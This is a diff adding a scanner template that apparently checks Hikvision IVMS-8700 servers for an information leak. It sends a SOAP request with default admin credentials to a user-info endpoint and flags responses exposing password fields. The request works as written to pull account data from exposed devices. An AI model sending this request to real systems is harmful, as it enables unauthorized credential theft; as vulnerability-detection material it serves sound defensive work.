@@ -1,0 +1,42 @@
+id: hikvision-ivms-8700-information-leak
+info:
+  name: Hikvision IVMS-8700 Information Leak
+  author: ProjectDiscoveryAI
+  severity: medium
+  tags: information-leak
+http:
+  - raw:
+      - |
+        POST /services/IWsBaseService.IWsBaseServiceHttpSoap11Endpoint HTTP/1.1
+        Host: {{Hostname}}
+        Authorization: Basic YWRtaW46MTIzNDU2
+        Content-Type: text/xml;charset=UTF-8
+
+        <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:impl="http://impl.ws.api.base.cms.hikvision.com" xmlns:xsd="http://ws.common.cms.hikvision.com/xsd">
+        <soapenv:Header/>
+        <soapenv:Body>
+        <impl:getAllUserInfo>
+        <impl:request>
+        <!--type: int-->
+        <xsd:pageNo>1</xsd:pageNo>
+        <!--type: int-->
+        <xsd:pageSize>1</xsd:pageSize>
+        </impl:request>
+        <!--type: long-->
+        <impl:updTime></impl:updTime>
+        </impl:getAllUserInfo>
+        </soapenv:Body>
+        </soapenv:Envelope>
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "<ax21:password>"
+        part: body
+      - type: word
+        words:
+          - "text/xml"
+        part: header
